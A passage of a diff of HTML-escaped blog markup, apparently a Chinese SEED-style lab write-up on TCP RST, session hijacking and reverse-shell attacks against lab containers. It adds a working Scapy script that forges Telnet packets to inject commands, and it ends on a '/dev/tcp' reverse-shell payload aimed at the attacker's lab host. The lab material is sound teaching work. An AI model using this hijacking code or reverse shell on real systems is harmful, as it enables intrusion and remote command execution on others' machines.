-&lt;/div&gt;&lt;p&gt;脚本会监听 &lt;code&gt;10.9.0.5&lt;/code&gt; 和 &lt;code&gt;10.9.0.6&lt;/code&gt; 之间的 TCP 流量，并根据捕获到的数据包构造对应的 RST 报文&lt;/p&gt;
-&lt;img src=&#34;7.png&#34; style=&#34;width: 90%;&#34; /&gt;
+&lt;/div&gt;&lt;img src=&#34;7.png&#34; style=&#34;width: 100%;&#34; /&gt;
 &lt;h3 id=&#34;验证-1&#34;&gt;验证
-&lt;/h3&gt;&lt;p&gt;回到受害者的 Telnet 界面，随便按下一个键触发通信&lt;/p&gt;
-&lt;p&gt;如果攻击成功，连接会被强制关闭&lt;/p&gt;
-&lt;img src=&#34;8.png&#34; style=&#34;width: 80%;&#34; /&gt;
-&lt;p&gt;这说明攻击者伪造的 RST 包被当前 TCP 会话接受，Telnet 连接被远程关闭&lt;/p&gt;
+&lt;/h3&gt;&lt;p&gt;回到受害者的 Telnet 界面，随便输入一个字符，如果攻击成功，连接会被强制关闭，这说明攻击者伪造的 RST 包被当成合法包接受了&lt;/p&gt;
+&lt;img src=&#34;8.png&#34; style=&#34;width: 90%;&#34; /&gt;
 &lt;h2 id=&#34;tcp-会话劫持&#34;&gt;TCP 会话劫持
-&lt;/h2&gt;&lt;p&gt;TCP 会话劫持的目标不是断开连接，而是向已有连接中注入数据。Telnet 这种明文协议没有额外的加密和完整性保护，只要攻击者能构造出符合当前 TCP 状态的数据包，服务端就可能把注入内容当作真实客户端发送的数据处理&lt;/p&gt;
-&lt;p&gt;本实验中，攻击者会劫持 &lt;code&gt;10.9.0.5&lt;/code&gt; 到 &lt;code&gt;10.9.0.6&lt;/code&gt; 的 Telnet 会话，并向服务端注入命令，让服务端创建 &lt;code&gt;/tmp/success&lt;/code&gt; 文件&lt;/p&gt;
-&lt;h3 id=&#34;建立连接-1&#34;&gt;建立连接
-&lt;/h3&gt;&lt;p&gt;在受害者容器中登录普通用户容器&lt;/p&gt;
+&lt;/h2&gt;&lt;p&gt;TCP 会话劫持就是向已有的连接中注入数据。Telnet 协议没有额外的加密和保护，攻击者如果能构造出和当前 TCP 状态相同的数据包，服务端就可能把注入内容当成客户端发来的数据&lt;/p&gt;
+&lt;h3 id=&#34;受害者-1&#34;&gt;受害者
+&lt;/h3&gt;&lt;p&gt;受害者连接用户&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -223,9 +747,76 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;telnet 10.9.0.6
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;登录账号为 &lt;code&gt;seed&lt;/code&gt;，密码为 &lt;code&gt;dees&lt;/code&gt;&lt;/p&gt;
-&lt;h3 id=&#34;攻击者-2&#34;&gt;攻击者
-&lt;/h3&gt;&lt;p&gt;在攻击者容器中运行会话劫持脚本&lt;/p&gt;
+&lt;/div&gt;&lt;h3 id=&#34;攻击者-2&#34;&gt;攻击者
+&lt;/h3&gt;&lt;p&gt;打开攻击脚本&lt;code&gt;hijacking_auto.py&lt;/code&gt;，把代码末尾 &lt;code&gt;sniff()&lt;/code&gt; 函数中的 &lt;code&gt;iface&lt;/code&gt; 改成实际的网卡名&lt;/p&gt;
+&lt;p&gt;脚本监听用户 &lt;code&gt;10.9.0.6&lt;/code&gt; 发给受害者 &lt;code&gt;10.9.0.5&lt;/code&gt; 的 Telnet 包，再伪造一个看起来像受害者发出的数据包，把创建 &lt;code&gt;/tmp/success&lt;/code&gt; 文件的命令注入到这个包中，&lt;code&gt;flags=&amp;quot;A&amp;quot;&lt;/code&gt; 表示这是一个 ACK 包&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/python3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;scapy.all&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;sys&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;spoof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;old_ip&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;old_tcp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TCP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;tcp_len&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;old_ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;len&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;old_ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ihl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;old_tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dataofs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# TCP data length&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;newseq&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;old_tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;newack&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;old_tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;seq&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tcp_len&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;old_ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dst&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dst&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;old_ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TCP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sport&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;old_tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dport&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;old_tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flags&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              &lt;span class=&#34;n&#34;&gt;seq&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;newseq&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;newack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;touch /tmp/success&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;ls&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;quit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;cli&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;srv&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;myFilter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;tcp and src host &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; and dst host &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; and src port 23&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;srv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cli&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Running Session Hijacking attack ...&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Filter used: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;myFilter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Spoofing TCP packets from Client (&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;) to Server (&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;)&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cli&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;srv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;sniff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;iface&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;br-4e1873a46169&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;filter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;myFilter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;prn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;spoof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;在攻击者容器中运行劫持脚本&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -234,37 +825,26 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 hijacking_auto.py 10.9.0.5 10.9.0.6
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;img src=&#34;9.png&#34; style=&#34;width: 90%;&#34; /&gt;
-&lt;p&gt;脚本会等待目标连接产生数据包，然后根据当前连接状态构造注入包。这里脚本设置了序列号偏移量，所以需要在受害者 Telnet 界面中连续输入 10 个字符来触发攻击&lt;/p&gt;
+&lt;/div&gt;&lt;img src=&#34;9.png&#34; style=&#34;width: 100%;&#34; /&gt;
 &lt;h3 id=&#34;验证-2&#34;&gt;验证
-&lt;/h3&gt;&lt;p&gt;在受害者 Telnet 界面中连续输入 10 个字符&lt;/p&gt;
-&lt;p&gt;然后在普通用户容器中查看 &lt;code&gt;/tmp/success&lt;/code&gt; 是否被创建&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ls -l /tmp/success
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;img src=&#34;10.png&#34; style=&#34;width: 80%;&#34; /&gt;
-&lt;p&gt;如果能够看到 &lt;code&gt;/tmp/success&lt;/code&gt; 文件，说明攻击者注入的命令已经被 &lt;code&gt;10.9.0.6&lt;/code&gt; 执行，会话劫持成功&lt;/p&gt;
+&lt;/h3&gt;&lt;p&gt;攻击脚本中有这一行&lt;code&gt;newseq = old_tcp.ack + 10&lt;/code&gt;，意思是伪造包的序列号比服务端期望的客户端序列号多10。刚发出时这个包的位置偏后，服务端不会立刻处理。受害者输入10个字符后，正常连接的序列号会推进10字节，推进到伪造包对应的位置时，服务端就会执行命令。所以这里需要在受害者 Telnet 界面中连续输入10个字符来触发攻击&lt;/p&gt;
+&lt;img src=&#34;11.png&#34; style=&#34;width: 100%;&#34; /&gt;
+&lt;p&gt;然后在用户容器中查看 &lt;code&gt;/tmp/success&lt;/code&gt; 是否被创建，可以看到能找到这个文件，说明攻击成功&lt;/p&gt;
+&lt;img src=&#34;10.png&#34; style=&#34;width: 50%;&#34; /&gt;
 &lt;h2 id=&#34;反向-shell-攻击&#34;&gt;反向 Shell 攻击
-&lt;/h2&gt;&lt;p&gt;反向 Shell 是在会话劫持基础上的进一步利用。前面的会话劫持只是注入一条创建文件的命令，如果把注入内容改成反向连接命令，就可以让目标主机主动连接攻击者，并把命令执行环境交给攻击者&lt;/p&gt;
-&lt;p&gt;这里的攻击依然发生在实验容器网络中，目标是让 &lt;code&gt;10.9.0.6&lt;/code&gt; 主动连接攻击者 &lt;code&gt;10.9.0.1&lt;/code&gt; 的 &lt;code&gt;9090&lt;/code&gt; 端口&lt;/p&gt;
+&lt;/h2&gt;&lt;p&gt;反向 Shell 是在会话劫持基础上的进一步攻击。前面的会话劫持只是注入一条创建文件的命令，如果把注入内容改成反向连接命令，就可以让用户主动连接攻击者，然后把命令执行权限交给攻击者&lt;/p&gt;
 &lt;h3 id=&#34;修改脚本&#34;&gt;修改脚本
-&lt;/h3&gt;&lt;p&gt;打开 &lt;code&gt;hijacking_auto.py&lt;/code&gt;，注释掉原来的 &lt;code&gt;touch&lt;/code&gt; 命令，改为反向 Shell 命令&lt;/p&gt;
+&lt;/h3&gt;&lt;p&gt;修改 &lt;code&gt;hijacking_auto.py&lt;/code&gt;，把创建文件命令改为反向 Shell 命令，这条命令会让用户把输入输出重定向到攻击者的 &lt;code&gt;9090&lt;/code&gt; 端口，效果类似远程终端&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;data = &amp;#34;\n/bin/bash -i &amp;gt;/dev/tcp/10.9.0.1/9090 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1\n&amp;#34;
